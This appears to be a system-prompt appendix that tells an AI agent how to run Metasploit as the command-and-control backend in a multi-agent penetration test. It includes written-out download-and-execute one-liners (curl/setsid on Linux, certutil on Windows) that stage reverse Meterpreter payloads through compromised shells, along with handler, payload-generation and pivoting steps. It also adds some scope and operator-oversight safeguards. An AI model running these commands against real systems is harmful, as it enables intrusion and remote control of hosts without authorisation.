# Metasploit C2 Backend Appendix

This appendix configures you to use **Metasploit** as the C2 backend — the
default whenever metasploit-framework is installed (see run.sh / config.sh).

**Meterpreter is the default for everything it supports**, not an optional
nicety:

- **Interactive shells** — every raw shell gets upgraded to Meterpreter; the
  Meterpreter session is the one teammates work from.
- **File transfer** — Meterpreter `upload`/`download`, not manual
  curl/certutil staging.
- **Pivoting / tunneling / proxying** — **load the `pivoting-tunneling` skill
  and prefer out-of-Framework tools (chisel / ligolo-ng / sshuttle / SSH
  `-D`/`-L`) by default.** Metasploit's in-Framework scoped-route + SOCKS is a
  **fallback only**: the SOCKS has proven unstable in practice (a dead relay
  wedges the shared RPC until msfconsole restarts). See [setup-pivot]
  Implementation below for the full ordering.
- **Post-exploitation** — `run_module` for post/exploit/auxiliary modules.

shell-server is used for exactly two things: catching the initial raw
reverse shell (teammates own the injection context), and as the automatic
fallback when a Meterpreter upgrade genuinely fails on a given target. Every
working session should be Meterpreter unless the upgrade failed — if you find
yourself handing back a shell-server session with no upgrade attempted, that's
a bug, not the plan.

**shell-server remains the initial access method.** Teammates establish raw
reverse shells. You upgrade to Meterpreter through the existing shell.

## Backend Tools

Metasploit: `mcp__metasploit-server__<tool>`
Shell-server: `mcp__shell-server__<tool>`

## [shell-established] Implementation — C2 Upgrade

When a teammate hands you an established shell-server session:

```
1. Verify session exists via shell-server list_sessions()
2. Stabilize the raw shell first: stabilize_shell(session_id)
3. Determine target OS/arch from the platform field
4. Choose a Meterpreter payload + free callback port:
   Linux   → linux/x64/meterpreter/reverse_tcp
   Windows → windows/x64/meterpreter/reverse_tcp
5. Start the handler:
   mcp__metasploit-server__start_handler(payload=<payload>,
       lhost=<callback_ip>, lport=<free_port>)
6. Generate a matching payload:
   mcp__metasploit-server__generate_payload(payload=<payload>,
       lhost=<callback_ip>, lport=<free_port>, format=<elf|exe>)
   → returns path under engagement/evidence/
7. Serve it: python3 -m http.server <serve_port> --directory <evidence_dir>
8. Download + execute through the existing shell-server shell:
   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/m && chmod +x /tmp/m && setsid /tmp/m </dev/null >/dev/null 2>&1 &")
   Note: setsid detaches it from the PTY so it survives close_session.
   Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\m.exe && start /b C:\\Windows\\Temp\\m.exe")
9. Poll metasploit-server list_sessions() for the new Meterpreter session
   (3s intervals, 10 attempts).

Alternative (no payload delivery needed): if the shell is already a
Metasploit shell session, use:
   mcp__metasploit-server__upgrade_to_meterpreter(session_id, lhost, lport)
```

Once the Meterpreter session connects:
```
a. Stop the HTTP server
b. Verify alive: execute(session_id, command="getuid") — if it succeeds,
   Meterpreter survived. Only now is it safe to close the shell-server session.
c. Send [session-ready] with backend=metasploit
```

**Spawn the operator's session — this is step 4 of Shell Ownership Flow in
shell-mgr.md, not optional.** Every shell handoff on this backend does this
once per host, right after the foothold, before you close the listener. So
the human operator can work the host in the live tmux msfconsole without
fighting the agents over one shell, give them their own session:
```
mcp__metasploit-server__spawn_operator_session(session_id=<the raw SHELL
   session you just caught, before/at upgrade time>, lhost=<callback>,
   lport=<a port distinct from the agents' handlers, e.g. 4444>)
```
Do this from the **shell** session (it re-stages via shell_to_meterpreter);
it spawns a second Meterpreter and reserves it for the operator. If the
foothold is already Meterpreter (no shell to re-stage), the tool returns
`needs_manual` — that's fine, skip it; the operator can reserve one themselves.
The agents keep working the original session as normal. Either way, mark this
host `operator_session_spawned=true` in your tracking map (see shell-mgr.md §
Session Tracking) so the next shell on the same host doesn't repeat this.

**Never drive an operator-reserved session.** `list_sessions()` marks reserved
sessions `operator_reserved: true`, and every session tool
(`execute`/`upload`/`download`/`kill_session`/…) refuses them with
`error: operator_reserved`. If you get that error, you grabbed the operator's
session — switch to another. Never `reserve_operator_session` /
`release_operator_session` on your own initiative; those are operator calls.

If the upgrade fails (download blocked, payload killed, port filtered):
```
a. Fall back to shell-server: send [session-ready] with backend=shell-server
b. The raw shell still works — don't lose it trying to upgrade
```

**Critical: never close the shell-server session until Meterpreter survives a
live `execute()`.** The raw shell is the fallback.

## [setup-process] Implementation

Credential-based access still uses shell-server:

```
Call mcp__shell-server__start_process(...)
Send [process-ready] with backend=shell-server
```

## [shell-dropped] Recovery

For Meterpreter sessions: if `list_sessions()` shows the session gone, the
handler (if still running as a job — check `list_jobs()`) will catch a
re-executed payload. Re-deliver the saved payload through any surviving access.

For shell-server sessions: same recovery as the shell-server appendix —
start new listener, re-deliver saved payload.

## One session per interacting agent

Two teammates driving the **same** session collide — their commands interleave
and any stateful/interactive work (a spawned sub-shell, a changed cwd, an
upgrade mid-flight) corrupts the other's. So **each agent that needs to
interact with a host gets its own session.** You (shell-mgr) own this
allocation:

- Track which session you've handed to which teammate (one session ↔ one
  teammate at a time).
- When a second teammate needs to interact with a host a first teammate
  already holds, spawn it a dedicated sibling and hand back the new id:
  ```
  mcp__metasploit-server__spawn_session(session_id="<existing foothold on that
     host>", lhost="<callback>", lport="<a free port, distinct from every other
     handler>")
  ```
  Reliable from a **shell** source; from a Meterpreter-only foothold it returns
  `needs_manual` — catch another callback (deliver a fresh payload to a new
  handler) and hand that id instead.
- One-off, read-only `execute()` checks can share (metasploit-server serializes
  each call), but anything beyond a single command — a workflow, an interactive
  tool, a privesc chain — needs the requesting agent's own session.
- The operator's reserved session is never handed to an agent (it's flagged
  `operator_reserved` and the tools refuse it).

## Handoff Instructions

For Meterpreter sessions:
```
[session-ready] session_id=<id> backend=metasploit platform=<linux|windows>
  Use mcp__metasploit-server__execute(session_id="<id>", command="...") for commands.
  Use mcp__metasploit-server__upload/download for file transfer.
  This session is yours — don't run commands on another teammate's session.
```

For shell-server sessions (fallback or credential-based):
```
[session-ready] session_id=<id> backend=shell-server platform=<linux|windows>
  Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
```

## [setup-pivot] Implementation — out-of-Framework first, MSF SOCKS as fallback

When the lead sends `[setup-pivot]` (which always carries `target_subnet`),
default to loading the `pivoting-tunneling` skill and using an **out-of-Framework
tool** (chisel / ligolo-ng / sshuttle / native SSH `-D`/`-L`). Metasploit's
in-Framework SOCKS is a **fallback only**.

```
1. ToolSearch("select:mcp__skill-router__get_skill")
   mcp__skill-router__get_skill(name="pivoting-tunneling")
2. Walk the skill's decision tree against what you have on the pivot host:
   SSH access → SSH -D / sshuttle; shell + outbound → chisel; TAP/transparent
   subnet access → ligolo-ng. Pick the first that fits.
3. Verify connectivity: proxychains4 nc -zv <target_in_subnet> <port>
   (sshuttle / ligolo may not need proxychains — see skill)
4. Message state-mgr: [add-tunnel] tunnel_type=<type> remote_host=<ip>
   remote_network=<cidr> local_port=<port> via_access_id=<N>
5. Send [pivot-ready] to the lead with endpoint + proxychains_line (if any)
```

**Why out-of-Framework first.** The `auxiliary/server/socks_proxy` module
runs inside the shared Metasploit Framework instance; when its underlying
session dies the relay doesn't automatically tear down, and the shared RPC
command dispatch wedges on the first subsequent call that touches that job
(including `list_jobs` / `kill_session`) — forcing a full msfconsole restart
to recover. A separate-process tunnel (chisel / ligolo-ng / sshuttle) can die
without taking the C2 with it; recovery is a fresh agent on target, not a
Framework restart.

**MSF SOCKS fallback.** `start_socks_proxy` **refuses to run** without
explicit certification that no alternative fits. Only use it when (a) the
attackbox cannot reach the pivot host inbound (no SSH, no chisel-reachable
listener), (b) you cannot drop a small binary on target (policy,
write-blocked filesystem, detection posture), or (c) you specifically need
every Metasploit module targeting the pivoted subnet to route transparently
without proxychains. For every other case, go back and use the
`pivoting-tunneling` skill.

When one of the three cases genuinely applies:

```
start_socks_proxy(
    session_id=<meterpreter-sid>,
    target_subnet=<cidr-from-lead>,
    srvport=1080,
    confirm_no_alternative=True,
    alternative_rejection_reason="<which alternative, specifically why not viable>",
)
  → Runs autoroute CMD=add with SUBNET+NETMASK (NOT autoadd), then starts
    auxiliary/server/socks_proxy. Returns endpoint + proxychains line.
    The rejection reason is written to the module-call log for the operator
    to review.
```

Missing/short `alternative_rejection_reason` (< 20 chars) is rejected — this
is not a bypass, it's a prompt to actually think about whether chisel /
ligolo-ng / sshuttle / SSH `-D` was tried first.

**NEVER use `autoroute CMD=autoadd` (un-scoped autoroute).** On a multi-homed
pivot host (dual-NIC jumphost, dockerized target, host with vpn/bridge
interfaces, or any secondary IPs) `autoadd` enumerates every interface and
adds a route per subnet — pulling in management, internet, or container
networks you did not scope. The result: agent traffic routed through subnets
outside `scope.allow`, flaky connectivity on the subnet you actually wanted,
and more rows in msfconsole's route table than any teardown can reliably
clean. `start_socks_proxy` enforces this: it refuses to run without
`target_subnet` unless you pass `allow_autoadd=True` explicitly, and it
returns a `warning` field when the fallback is used.

Scope note: hosts reached through the pivot are still subject to
`engagement/scope.allow` when you run modules against them via
`run_module`/`console_exec`. Internal subnets you intend to attack must be in
scope.

If you do NOT have a Meterpreter session on the pivot host (e.g. only
shell-server access), fall back to loading the `pivoting-tunneling` skill:
```
ToolSearch("select:mcp__skill-router__get_skill")
mcp__skill-router__get_skill(name="pivoting-tunneling")
```
Follow the skill methodology for chisel/sshuttle/ligolo setup.
